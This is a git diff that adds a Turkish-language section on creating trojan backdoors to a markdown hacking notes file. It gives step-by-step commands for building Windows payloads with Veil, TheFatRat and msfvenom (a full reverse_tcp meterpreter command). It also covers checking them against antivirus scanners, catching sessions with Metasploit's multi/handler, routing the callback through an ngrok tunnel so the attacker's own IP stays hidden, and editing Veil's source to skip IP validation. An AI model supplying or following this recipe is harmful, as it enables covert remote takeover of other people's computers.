@@ -39,7 +39,16 @@
   - [SSH](#SSH)
   - [SAMBA](#SAMBA)
   - [POSTGRESQL METERPRETER](#POSTGRESQL-METERPRETER)
-
+- [Trojan Backdoor Oluşturma](#Trojan-Backdoor-Oluşturma)
+  - [Veil](#Veil)
+  - [Multihandler Backdoor Dinleme](#Multihandler-Backdoor-Dinleme)
+  - [Fatrat](#Fatrat)
+    - [Dinlemek içim](#Dinlemek-İçin)
+  - [Msfvenom](#Msfvenom)
+  - [Ngrok](#Ngrok)
+    - [Kendi IP Adresimizi Kullanmadan Trojan Oluşturma](#Kendi-IP-Adresimizi-Kullanmadan-Trojan-Oluşturma)
+    - [Hata](#Hata)
+    
 # 1-VPN DNS MAC 
 
 VPN (Virtual Personal Network)
@@ -348,4 +357,71 @@ Samba linux sunucuları ile windows sunucularını birbirine bağlar. Şirketler
 
 # 9- Trojan Backdoor Oluşturma
 
-### 
+### Veil
+
+1. Veil opt içinde kurulu olduğu için ```/opt``` içine giriyoruz
+2.```python3 veil.py``` 
+3.```>>use 1``` 
+4.```>>list``` diyerek farklı dillerde ve amaçlarda backdoor seçeneklerini listeleriz
+5.```LPORT, LHOST, sleep, processors``` gibi ayarları değiştirip ```generate``` diyerek trojanı oluşturmaya başlarız
+6. Oluşturulan trojan'ın konumunu görürüz (var/lib/veil/output/complied) 
+7. Oluşturduğumuz trojan'ı ```antiscan.me``` gibi sitelerde test edebiliriz
+
+### Multihandler Backdoor Dinleme
+
+1.```msfconsole``` 
+2.```use exploit/multi/handler``` diyerek payload tanımlıyoruz
+3.```set patload windows/meterpreter/reverse_http```  (trojanın oluşturulma tipine göre değişiklik gösterebilir)
+4.```LHOST ve LPORT```'u değiştiriyoruz
+5.```exploit -j -z``` ile dinlemeye başlıyoruz 
+6. Trojan çalıştığında ```sessions -l``` ve ```session 1``` ile backdoor'dan giriş yapıyoruz
+
+```service apache2 start/stop``` Kendi IP'mizin Web servisini aktif hale getirir
+
+### Fatrat
+
+1.```fatrat``` ile framework'ü açıyoruz
+2. Yapmak istediğimiz işleme göre seçim yapıyoruz trojan oluşturmak için ```[02] Create Fud Backdoor with Fudwin 1.0``` seçiyoruz
+3. Trojanı yapıcağımız tool'u seçiyoruz ```[1] Hızlı [2] Yavaş fakat diğerine göre daha güçlü```
+4.```LHOST, LPORT``` giriyoruz
+5. Trojan adını seçiyoruz
+6. ```32bit/64bit``` seçiyoruz
+7. Trojan'ı oluşturuyoruz ve dinliyoruz
+
+> ### Dinlemek için
+
+1.```msfconsole``` 
+2.```use exploit/multi/handler``` diyerek payload tanımlıyoruz
+3.```set patload windows/meterpreter/reverse_tcp```  (trojanın oluşturulma tipine göre değişiklik gösterebilir) 
+4.```LHOST ve LPORT```'u değiştiriyoruz
+5.```exploit -j -z``` ile dinlemeye başlıyoruz 
+6. Trojan çalıştığında ```sessions -l``` ve ```session 1``` ile backdoor'dan giriş yapıyoruz
+
+### Msfvenom
+
+
+```msfvenom -p windows/meterpreter/reverse_tcp -a X86 --platform windows lhost=0.tcp... lport=12345 -f exe -o /root/newbackdoor.exe```
+```
+-p: payload
+-a: bit sayısı
+--platform: hangi platformda çalışacağı 
+lhost: ngrok'dan kopyaladığımız IP
+lport: ngrok'dan kopyaladığımız PORT
+-f: dosya uzantısı 
+-o: trojan'in kaydedileceği konum
+```
+
+### Ngrok
+
+> ### Kendi IP Adresimizi Kullanmadan Trojan Oluşturma
+
+1. ```ngrok.com``` sitesine gidiyoruz, üye oluyoruz ve profilimizde bize ait olan token'ı kopyalıyoruz
+2. Terminale giriyoruz ve ```.ngrok config add-authtoken 2BA7...Xoh``` çalıştırıyoruz 
+3. ```./ngrok``` çalıştırarak ngrok'u açıyoruz ```./ngrok help``` ile menüyü açabiliriz
+4. ```./ngrok tcp 4242``` çalıştırarak 4242 portunda tünel servisini açıyoruz
+5. ```forwarding``` kısmındaki ```IP``` ve ```PORT```'u kaydediyoruz
+
+> ### Hata 
+
+```/opt/veil/tools/evasion/tool.py``` içindeki kodda ```!Error!You did not provide a valid IP``` kodunu siliyoruz(421-424.satır)
+```selected_payload__ ``` kısmını if ile alt alta getirip ```if helpes validate_ip(value)``` kodunu siliyoruz
